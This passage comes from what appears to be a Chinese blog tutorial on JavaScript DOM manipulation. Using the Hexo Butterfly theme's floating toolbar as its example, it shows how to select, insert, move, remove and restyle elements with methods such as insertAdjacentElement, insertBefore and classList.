class="property">documentElement</span>;</span><br></pre></td></tr></table></figure><p>这个属性返回文档的根元素，对于 HTML 文档来说，就是 <code>&lt;html&gt;</code> 元素</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>;</span><br></pre></td></tr></table></figure><p>这个属性返回文档的 <code>&lt;body&gt;</code> 元素，即包含文档主体内容的元素</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.className&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这个方法返回文档中第一个匹配指定 CSS 选择器的元素。例如，<code>document.querySelector('.header')</code> 会返回文档中第一个具有 header 类的元素</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.parent .a&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这个方法返回一个 NodeList，包含所有与指定 CSS 选择器匹配的元素。在这个例子中，它会返回所有 <code>.parent</code> 元素内的 <code>.a</code> 元素。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.parent &gt; .a&#x27;</span>);</span><br></pre></td></tr></table></figure><p>与上面那个类似，不过这里只返回 <code>.parent</code> 元素内的直接子元素 <code>.a</code> 元素。</p><h2 id="获取变量">获取变量</h2><table><thead><tr><th>特性</th><th>var</th><th>let</th><th>const</th></tr></thead><tbody><tr><td>作用域</td><td>函数作用域。在函数内部是局部变量，在函数外部是全局变量</td><td>块级作用域。只在它们所在的代码块内有效</td><td>块级作用域。只在它们所在的代码块内有效</td></tr><tr><td>变量提升</td><td>是。变量可以在声明之前使用，但值为 undefined</td><td>否。使用前必须先声明，否则会报错</td><td>否。使用前必须先声明，否则会报错</td></tr><tr><td>重复声明</td><td>允许</td><td>不允许</td><td>不允许</td></tr><tr><td>初始值</td><td>可选。声明的是变量</td><td>可选。声明的是变量</td><td>必须。声明的是常量，必须在声明时初始化</td></tr><tr><td>可修改性</td><td>可以</td><td>可以</td><td>不可以</td></tr><tr><td>全局对象属性</td><td>是</td><td>否</td><td>否</td></tr></tbody></table><h2 id="插入元素">插入元素</h2><p>例如，Hexo Butterfly 主题的右下角悬浮工具栏，最原始的情况下它渲染出来是这样的：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;rightside&quot;</span> <span class="attr">class</span>=<span class="string">&quot;rightside-show&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;rightside-config-hide&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;translateLink&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">title</span>=<span class="string">&quot;简繁转换&quot;</span>&gt;</span></span><br><span class="line">      繁</span><br><span class="line">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;darkmode&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">title</span>=<span class="string">&quot;浅色和深色模式转换&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fas fa-adjust&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;hide-aside-btn&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">title</span>=<span class="string">&quot;单栏和双栏切换&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fas fa-arrows-alt-h&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;rightside-config-show&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;rightside-config&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">title</span>=<span class="string">&quot;设置&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fas fa-cog fa-spin&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;go-up&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">title</span>=<span class="string">&quot;回到顶部&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;scroll-percent&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fas fa-arrow-up&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>实际上，它提供的几个按钮已经能满足基本使用，也可能是作者认为这里无需改动，截至目前，此主题的配置项中，对这里的悬浮菜单栏的调整只有少数几个功能的开关。但假设有这么个场景：</p><blockquote><p>在“繁”这个按钮上方添加两个按钮，从下往上分别为“刷新”和“弹窗”。</p></blockquote><p>如果不改源码，仅依靠 js 操作 DOM，我们可以采用<code>insertAdjacentElement()</code>方法，将一个给定的元素节点插入到相对于当前元素的指定位置。</p><details class="toggle" ><summary class="toggle-button" style="">insertAdjacentElement() 方法</summary><div class="toggle-content"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">insertAdjacentElement</span>(position, element)</span><br></pre></td></tr></table></figure><p><code>position</code>表示相对于 <code>targetElement</code>的位置的字符串；必须是以下字符串之一（大小写不敏感）：</p><ul><li><code>beforebegin</code>：targetElement 之前。</li><li><code>afterbegin</code>：targetElement 内部的第一个子节点之前。</li><li><code>beforeend</code>：targetElement 内部的最后一个子节点之后。</li><li><code>afterend</code>：targetElement 之后。</li></ul><p><code>element</code>表示要插入到树中的元素。</p><p>position 的四个字符串对应如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- beforebegin --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;target&quot;</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- afterbegin --&gt;</span></span><br><span class="line">  The quick brown fox jumps over the lazy dogelement</span><br><span class="line">  <span class="comment">&lt;!-- beforeend --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- afterend --&gt;</span></span><br></pre></td></tr></table></figure><p>只有当节点处于 DOM 树中且有一个父元素时 beforebegin 和 afterend 才会生效。</p></div></details><p>现在这个问题就好办了，可以通过以下方法实现相关功能，把代码放到自定义 js 文件中并在配置文件中引入即可（MDN 给出的示例采用了箭头函数，若换那种写法会比下面这个简洁）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;pjax:complete&quot;</span>,rightsideAddon);<span class="comment">//适配 Hexo Butterfly 主题 pjax 功能。实际上你只需要关注这段代码中 function rightsideAddon() 包裹的部分</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">rightsideAddon</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">//获取元素</span></span><br><span class="line">  <span class="keyword">const</span> darkmode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;darkmode&quot;</span>);<span class="comment">//通过 getElementById 方法获取页面中名为 darkmode 的元素并将其存储在变量 darkmode 中，下同。</span></span><br><span class="line">  <span class="keyword">const</span> translateLink = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;translateLink&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//创建元素</span></span><br><span class="line">  <span class="keyword">const</span> buttonAlert = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;button&quot;</span>);<span class="comment">// 创建 button 按钮元素并将其存储在变量 buttonAlert 中</span></span><br><span class="line">  buttonAlert.<span class="property">id</span> = <span class="string">&quot;alert&quot;</span>;<span class="comment">//设置 buttonAlert 元素的 id 属性为 Alert</span></span><br><span class="line">  buttonAlert.<span class="property">type</span> = <span class="string">&quot;button&quot;</span>;<span class="comment">//设置 buttonAlert 元素的 type 属性为 button</span></span><br><span class="line">  buttonAlert.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;i class=&quot;fas fa-hand-pointer&quot; /&gt;&#x27;</span>;<span class="comment">//设置 buttonAlert 元素内容为一个带有图标的 HTML 字符串，这里使用单引号包裹。你也可以将此处改为 textContent，后面用双引号包裹文本。</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> buttonRefresh = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;button&quot;</span>);</span><br><span class="line">  buttonRefresh.<span class="property">id</span> = <span class="string">&quot;refresh&quot;</span>;</span><br><span class="line">  buttonRefresh.<span class="property">type</span> = <span class="string">&quot;button&quot;</span>;</span><br><span class="line">  buttonRefresh.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;i class=&quot;fas fa-sync-alt&quot;/&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 插入元素。若存在 position 相同的情况，则按照此处顺序进行加载。例如若将这两段代码调换位置，那么“刷新”按钮会在“弹窗”按钮上方。</span></span><br><span class="line">  translateLink.<span class="title function_">insertAdjacentElement</span>(<span class="string">&quot;beforebegin&quot;</span>, buttonAlert);<span class="comment">//将 buttonAlert 元素插入到 translateLink 元素之前，下同。</span></span><br><span class="line">  translateLink.<span class="title function_">insertAdjacentElement</span>(<span class="string">&quot;beforebegin&quot;</span>, buttonRefresh);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//按钮对应的功能</span></span><br><span class="line">  buttonAlert.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;弹窗&quot;</span>);</span><br><span class="line">  &#125;);<span class="comment">//添加了一个点击事件监听器。当 buttonAlert 按钮被点击时，会弹出一个包含文本“弹窗”的警告框。</span></span><br><span class="line">  buttonRefresh.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    location.<span class="title function_">reload</span>();</span><br><span class="line">  &#125;);</span><br><span class="line"><span class="title function_">rightsideAddon</span>();</span><br></pre></td></tr></table></figure><p>这段 js 在经过浏览器渲染后是这样的（事件监听器部分省略）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;alert&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fas fa-hand-pointer&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">i</span> <span class="attr">class</span>=<span class="string">&quot;fas fa-sync-alt&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">i</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="DOM-位置移动">DOM 位置移动</h2><p>还是上节那个示例，现在有这样一个需求：</p><blockquote><p>将齿轮按钮和返回顶部按钮的位置进行互换</p></blockquote><p>在 JavaScript 中有<code>insertBefore()</code>方法，用于在指定元素之前插入新元素。</p><details class="toggle" ><summary class="toggle-button" style="">insertBefore() 方法</summary><div class="toggle-content"><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> insertedNode = parentNode.<span class="title function_">insertBefore</span>(newNode, referenceNode);</span><br></pre></td></tr></table></figure><ul><li><code>insertedNode</code> 被插入节点 (newNode)</li><li><code>parentNode</code> 新插入节点的父节点</li><li><code>newNode</code> 用于插入的节点</li><li><code>referenceNode</code> newNode 将要插在这个节点之前。如果该值为<code>null</code>则 newNode 将被插入到子节点的末尾；不应将此值留空。</li></ul></div></details><p>现在需要做的便是：获取示例中两个按钮对应的元素（<code>rightsideConfig</code>和<code>goUpButton</code>），然后再获取父节点（示例中<code>rightsideConfig</code>是不动的，可以把它理解为“参照物”），然后将元素插入到这个父节点元素之前。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> rightsideConfig = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;rightside-config&quot;</span>);<span class="comment">//获取元素并储存变量</span></span><br><span class="line"><span class="keyword">const</span> goUpButton = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;go-up&quot;</span>);<span class="comment">//获取将要插入的节点</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> parentRightsideConfig = rightsideConfig.<span class="property">parentNode</span>;<span class="comment">//获取父节点</span></span><br><span class="line"></span><br><span class="line">parentRightsideConfig.<span class="title function_">insertBefore</span>(goUpButton, rightsideConfig);<span class="comment">//将 goUpButton 插入到 rightsideConfig 元素之前。与 MDN 中示例不同的是，这里 referenceNode 正好也是那个父节点，因此“少”写了一个变量获取</span></span><br></pre></td></tr></table></figure><p>也可以直接在父节点上执行插入操作（可能会导致两次 DOM 操作，对性能要求不苛刻的情况下与前面那种相似）：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> rightsideConfig = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;rightside-config&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> goUpButton = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;go-up&quot;</span>);</span><br><span class="line"></span><br><span class="line">rightsideConfig.<span class="property">parentNode</span>.<span class="title function_">insertBefore</span>(goUpButton, rightsideConfig);</span><br></pre></td></tr></table></figure><p>对于其他元素也是同理，例如把“浅色和深色模式转换”按钮移动到“设置”按钮上方，只需通过相同的方法获取其对应 id（<code>darkmode</code>）并储存变量，然后将“newNode”的位置进行替换即可。</p><p>前面一节，我们举了插入唤出弹窗的按钮的例子，如果使用<code>insertBefore()</code>方法，可以这样实现：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;pjax:complete&quot;</span>, rightsideAddon);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">rightsideAddon</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> darkmode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;darkmode&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> translateLink = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;translateLink&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> buttonAlertExist = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;alert&quot;</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 检查按钮是否已存在</span></span><br><span class="line">  <span class="keyword">if</span> (!buttonAlertExist) &#123;</span><br><span class="line">    <span class="keyword">const</span> buttonAlert = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;button&quot;</span>);</span><br><span class="line">    buttonAlert.<span class="property">id</span> = <span class="string">&quot;alert&quot;</span>;</span><br><span class="line">    buttonAlert.<span class="property">type</span> = <span class="string">&quot;button&quot;</span>;</span><br><span class="line">    buttonAlert.<span class="property">innerHTML</span> = <span class="string">&#x27;&lt;i class=&quot;fas fa-hand-pointer&quot;&gt;&lt;/i&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 确保 translateLink 已定义</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> translateLink !== <span class="string">&#x27;undefined&#x27;</span> &amp;&amp; translateLink.<span class="property">parentNode</span>) &#123;</span><br><span class="line">      translateLink.<span class="property">parentNode</span>.<span class="title function_">insertBefore</span>(buttonAlert, translateLink);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  buttonAlert.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&quot;弹窗&quot;</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">rightsideAddon</span>();</span><br></pre></td></tr></table></figure><p>若 translateLink 存在且其父节点有效，代码会将新创建的按钮插入到 translateLink 之前。</p><details class="toggle" ><summary class="toggle-button" style="">有 Before，有没有 After？</summary><div class="toggle-content"><p>没有<code>insertAfter()</code>方法。可以通过将 insertBefore 方法与 Node.nextSibling 结合使用来模拟实现。</p><p>此处偷个懒，直接借用 MDN 的例子：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;parentElement&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">&quot;childElement&quot;</span>&gt;</span>foo bar<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 创建新的普通 &lt;span&gt; 元素</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> sp1 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;span&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 获取引用元素</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> sp2 = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;childElement&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 获取父元素</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">let</span> parentDiv = sp2.<span class="property">parentNode</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 在 sp2 之前插入新元素</span></span></span><br><span class="line"><span class="language-javascript">  parentDiv.<span class="title function_">insertBefore</span>(sp1, sp2);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以使用以下方法在 sp2 后面插入 sp1：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parentDiv.<span class="title function_">insertBefore</span>(sp1, sp2.<span class="property">nextSibling</span>);</span><br></pre></td></tr></table></figure><p>如果 sp2 没有下一个兄弟节点，那么它必须是最后一个子节点——sp2.nextSibling 返回 null，此时 sp1 将被插入到子节点列表的末尾（紧接在 sp2 之后）。</p></div></details><h2 id="隐藏或移除">隐藏或移除</h2><p>如果希望隐藏一个元素，可以使用<code>Element.style.display = 'none'</code>或<code>Element.remove();</code>。二者的不同之处在于，前者只是隐藏该元素，后者会将此元素移除。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> buttonGoup = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;go-up&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> rightsideConfig = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;rightside-config&#x27;</span>);</span><br><span class="line"></span><br><span class="line">rightsideConfig.<span class="title function_">remove</span>();<span class="comment">//移除元素</span></span><br></pre></td></tr></table></figure><p>以上这段代码执行后，在页面结构中<code>&lt;button id=&quot;rightside-config&quot; type=&quot;button&quot; title=&quot;设置&quot;&gt;</code>及其子元素都会被移除。如果将代码中的<code>rightsideConfig.remove();</code>修改为<code>rightsideConfig.style.display = 'none'</code>，实际上是在该元素后添加属性<code>style=&quot;display: none;&quot;</code>，并算作真正删除元素。</p><h2 id="替换元素">替换元素</h2><p>或许有人想让页面中某些效果通过一定的操作再显示，譬如在哪里点了下，触发了某段 js 代码，然后页面发生了变化。</p><details class="toggle" ><summary class="toggle-button" style="">document.querySelector()</summary><div class="toggle-content"><p>文档对象模型 Document 引用的 <code>querySelector()</code> 方法返回文档中与指定选择器或选择器组匹配的第一个 Element 对象。如果找不到匹配项，则返回 null。</p><p>它与<code>Document.querySelectorAll</code>的区别之一便是当 DOM 中存在多个匹配结果时，前者只匹配第一个，后者会匹配所有。</p></div></details><p>这里可以采用 const 获取元素，之后通过 Element.className 或 <a href="http://Element.id" rel="external nofollow noreferrer">Element.id</a> 进行修改。</p><p>例如，让前面那个例子中的 class 为<code>rightside-show</code>的元素修改为 class 为<code>rightside-show-re</code>，让 id 为<code>translateLink</code>的元素修改为<code>translateLink-re</code>，可以采取这样的方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取要渲染内容的 div 元素</span></span><br><span class="line"><span class="keyword">const</span> rightsideShow = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.rightside-show&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改第一个 div 的 class 和 id</span></span><br><span class="line">rightsideShow.<span class="property">className</span> = <span class="string">&#x27;rightside-show-re&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 translateLink 元素</span></span><br><span class="line"><span class="keyword">const</span> translateLink = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;translateLink&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改元素的 class 属性</span></span><br><span class="line">translateLink.<span class="property">id</span> = <span class="string">&#x27;translateLink-re&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="修改-class-以匹配不同样式">修改 class 以匹配不同样式</h2><details class="toggle" ><summary class="toggle-button" style="">Element.className 和 Element.classList</summary><div class="toggle-content"><p>Element.className 用于获取或设置指定元素的 class 属性的值。 Element.classList 是一个只读属性，返回一个元素 class 属性的动态 DOMTokenList 集合。这可以用于操作 class 集合。</p><p>相比将 element.className 作为以空格分隔的字符串来使用，classList 是一种更方便的访问元素的类列表的方法。</p></div></details><p>如果你提前把相应的 CSS 代码写好，那么在调整样式时可以只考虑修改元素的 class 名以匹配相应的样式，而不必通过 element 加后缀一个个设置。</p><p>这里可以通过<code>element.className</code>进行修改。仍以那个悬浮栏为例，假设有一个提前写好的 CSS 样式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.rightsideShow-r</span>&#123;</span><br><span class="line">  <span class="comment">/*相关样式，代码略*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在需要将这个 class 为<code>rightside-show</code>的元素进行调整，变更其类名，可以通过下面这个方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> rightsideShow = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;.rightside-show&#x27;</span>);</span><br><span class="line"></span><br><span class="line">rightsideShow.<span class="property">className</span> = <span class="string">&#x27;rightsideShow-r&#x27;</span>;</span><br></pre></td></tr></table></figure><p>但这么做会存在一个问题：有时我们并不想让原来 class 类名匹配的样式失效（刚才这个方法会直接替换原有类名，也就是说选择器<code>rightside-show</code>相关的样式会失效）。</p><p>好在 js 中提供了<code>element.classList</code>方法，虽然是只读，但可通过<code>add()</code>、<code>remove()</code>等方法修改元素。下面三个是比较常用的：</p><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td>add(‘class1’, ‘class2’)</td><td>在元素中添加一个或多个类名。如果指定的类名已存在，则不会添加</td></tr><tr><td>remove(‘class1’, 